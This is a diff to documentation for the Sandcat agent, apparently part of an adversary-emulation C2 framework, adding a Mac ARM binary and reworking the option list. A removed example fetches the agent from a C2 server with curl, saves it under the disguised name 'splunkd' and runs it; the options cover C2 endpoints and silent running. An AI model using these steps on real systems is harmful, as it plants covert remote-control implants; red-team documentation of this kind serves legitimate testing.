@@ -23,6 +23,7 @@ various use cases.
 ## Precompiled Binaries
 Precompiled agent binaries are located in the `payloads` directory and are referenced with the following filename:
 - `sandcat.go-darwin` compiled binary for Mac targets
+- `sandcat.go-darwin-arm64` compiled binary for Mac with ARM processor targets
 - `sandcat.go-linux` compiled binary for Linux targets
 - `sandcat.go-windows` compiled binary for Windows targets
 
@@ -43,19 +44,9 @@ the agent will re-compile itself dynamically to obtain a new file hash. This wil
 
 ### Options
 
-For MacOS, both amd64 and arm64 are supported. When retrieving the executable from the server, the architecture header
-can be used to select the correct executable: `-H "architecture:amd64"` or `-H "architecture:arm64"`.
-
-For example, requesting Sandcat on a MacOS amd64-based target:
-```
-server="http://0.0.0.0:8888";
-curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download > splunkd;
-chmod +x splunkd;
-./splunkd -server $server -v
-```
-
 When running the Sandcat agent binary, there are optional parameters you can use when you start the executable:
 
+* `-H "architecture: [architecture]"`: For MacOS, both amd64 and arm64 are supported. When retrieving the executable from the server, the architecture header can be used to select the correct executable: `-H "architecture:amd64"` or `-H "architecture:arm64"`.
 * `-server [C2 endpoint]`: This is the location (e.g. HTTP URL, IPv4:port string) that the agent will use to reach the C2 server. (e.g. `-server http://10.0.0.1:8888`, `-server 10.0.0.1:53`, `-server https://example.com`). The agent must have connectivity to this endpoint. 
 * `-group [group name]`: This is the group name that you would like the agent to join when it starts. The group does not have to exist beforehand. A default group of `red` will be used if this option is not provided (e.g. `-group red`, `-group mygroup`)
 * `-v`: Toggle verbose output from sandcat. If this flag is not set, sandcat will run silently. This only applies to output that would be displayed on the target machine, for instance if running sandcat from a terminal window. This option does not affect the information that gets sent to the C2 server.
